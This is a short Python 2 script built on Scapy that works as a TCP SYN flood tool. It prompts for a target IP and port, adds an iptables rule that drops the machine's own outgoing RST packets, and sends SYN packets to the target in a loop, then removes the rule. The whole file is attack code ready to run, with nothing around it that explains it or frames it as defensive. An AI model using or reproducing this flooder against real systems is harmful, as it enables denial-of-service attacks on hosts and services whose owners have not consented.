from scapy.all import *
import os, ip_misc

def flood():
    target_ip = raw_input("Target IP:")
    target_port = raw_input("Port [80]:") or "80"
    if ip_misc.check_port(target_port):
        p = IP(dst=target_ip, id=1111, ttl=99)/TCP(sport=RandShort(),dport=int(target_port),seq=12345,ack=1000,window=1000,flags="S")/""
        #iptables rule to prevent the system from sending RESET tcp packets
        os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
        print "Sending packets..."
        answered, unanswered = srloop(p,inter=0.2,retry=2)
        print "Summary:"
        answered.summary()
        unanswered.summary()
        #clear iptables drop rule
        os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")
    else:
        print "Port number must be in range 1-65535"
